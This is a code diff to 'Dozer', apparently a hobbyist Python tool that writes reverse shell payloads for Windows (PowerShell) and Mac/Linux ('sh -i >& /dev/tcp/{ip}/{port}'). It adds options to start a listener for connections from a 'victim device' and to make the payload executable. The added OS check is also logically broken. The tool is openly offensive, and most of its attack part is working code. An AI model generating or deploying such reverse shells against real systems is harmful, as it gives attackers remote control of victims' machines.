@@ -1,7 +1,7 @@
 import argparse
 import ipaddress
 import sys
-import socket
+import time
 import subprocess
 
 
@@ -10,17 +10,29 @@ class Dozer:
     tool
     """
 
-    def __init__(self, ip: str, port: int, os: str, output: str) -> None:
+    def __init__(
+        self,
+        parser,
+        ip: str,
+        port: int,
+        os: str,
+        output: str,
+        listener: bool,
+        executable: bool,
+    ) -> None:
         """
         initialization for hacksmith tool
         """
+        self.parser = parser
         if not self.__check_ip(ip):
-            self.__error("invalid ip")
-            sys.exit(1)
-        self.ip = ip
-        self.port = port
-        self.os = os
-        self.output_filename = output
+            parser.error("invalid ip")
+
+        self.ip: str = ip
+        self.port: int = port
+        self.os: str = os
+        self.output_filename: str = output
+        self.start_listener: bool = listener
+        self.executable: bool = executable
 
     def create(self):
         """
@@ -34,6 +46,7 @@ class Dozer:
         print(f"os = {self.os}")
         print("-------------")
 
+        time.sleep(1)
         match self.os:
             case "windows":
                 print(f"creating {self.output_filename} revshell for windows")
@@ -50,6 +63,10 @@ class Dozer:
             case "ios":
                 print(f"creating {self.output_filename} revshell for ios")
                 print("creating revshell for ios")
+
+        if self.start_listener:
+            print("//LOG: starting listener")
+            self.init_listener()
 
         return
 
@@ -94,6 +111,7 @@ while (($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{
 $StreamWriter.Close()
 """
 
+        time.sleep(1)
         with open(f"{self.output_filename}.ps1", "w", encoding="utf-8") as f:
             f.write(ps_script)
             print(f"//LOG: created {self.output_filename} file")
@@ -103,11 +121,12 @@ $StreamWriter.Close()
         mac and linux has same rev shell, fuck your naming patterns
         """
         script = f"sh -i >& /dev/tcp/{self.ip}/{self.port} 0>&1"
+        time.sleep(1)
         with open(f"{self.output_filename}.sh", "w", encoding="utf-8") as f:
             f.write(script)
             print(f"//LOG: created {self.output_filename}.sh")
-            user_input = input("do you wanna make it executable (Y/n): ").lower()
-            if user_input == "y":
+            if self.executable:
+                time.sleep(0.5)
                 print("//LOG: making rev shell executable")
                 subprocess.run(["chmod", "+x", f"{self.output_filename}.sh"])
                 print("//LOG: revshell is now exectuable!")
@@ -130,9 +149,19 @@ def main():
         epilog="made by n0_sh4d3",
     )
 
-    parser.add_argument("--ip", help="home ip address")
-    parser.add_argument("--port", help="port number")
+    parser.add_argument("--ip", help="home ip address", required=True, type=str)
+    parser.add_argument("--port", help="port number", required=True, type=int)
     parser.add_argument("--output", help="name for output revshell file")
+    parser.add_argument(
+        "--listener",
+        help="optional flag to start listening for connection from victim device",
+        action="store_true",
+    )
+    parser.add_argument(
+        "--exec",
+        help="make reverse shell executable (works only for mac/linux)",
+        action="store_true",
+    )
     parser.add_argument(
         "--os",
         help="target os",
@@ -146,13 +175,6 @@ def main():
     )
 
     args = parser.parse_args()
-    try:
-        args.port = int(args.port)
-
-    except ValueError:
-        print("port must be an int")
-        sys.exit(1)
-
     if args.port <= 1024:
         print("port cannot be lower than 1024")
     if args.port > 65535:
@@ -161,8 +183,19 @@ def main():
     if args.output is None:
         args.output = "rev_shell"
 
+    if args.exec and args.os != "linux" or args.os != "mac":
+        raise parser.error(f"can't make {args.os} rev shell executable")
+
     # that's all i need to see in main lol
-    tool = Dozer(ip=args.ip, port=args.port, os=args.os, output=args.output)
+    tool = Dozer(
+        parser=parser,
+        ip=args.ip,
+        port=args.port,
+        os=args.os,
+        output=args.output,
+        listener=args.listener,
+        executable=args.exec,
+    )
     tool.create()
 
 
